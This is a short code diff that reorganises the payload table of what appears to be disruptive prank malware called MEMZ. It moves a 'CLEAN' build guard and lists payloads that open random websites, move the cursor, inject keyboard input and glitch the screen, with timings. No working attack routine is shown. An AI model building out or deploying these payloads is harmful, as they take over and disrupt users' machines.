@@ -1,7 +1,7 @@
 #include "memz.h"
 
-#ifdef CLEAN
 PAYLOAD payloads[] = {
+#ifdef CLEAN
 	{ payloadExecute, L"Open random websites/programs", NULL, 0, 0, 0, 0, FALSE },
 	{ payloadCursor, L"Random cursor movement", NULL, 0, 0, 0, 0, TRUE },
 	{ payloadKeyboard, L"Random keyboard input", NULL, 0, 0, 0, 0, FALSE },
@@ -13,7 +13,6 @@ PAYLOAD payloads[] = {
 	{ payloadPIP, L"Render screen into screen", NULL, 0, 0, 0, 0, TRUE },
 	{ payloadPuzzle, L"Screen glitches", NULL, 0, 0, 0, 0, TRUE }
 #else
-const PAYLOAD payloads[] = {
 	{ payloadExecute, 30000 },
 	{ payloadCursor, 30000 },
 	{ payloadKeyboard, 20000 },
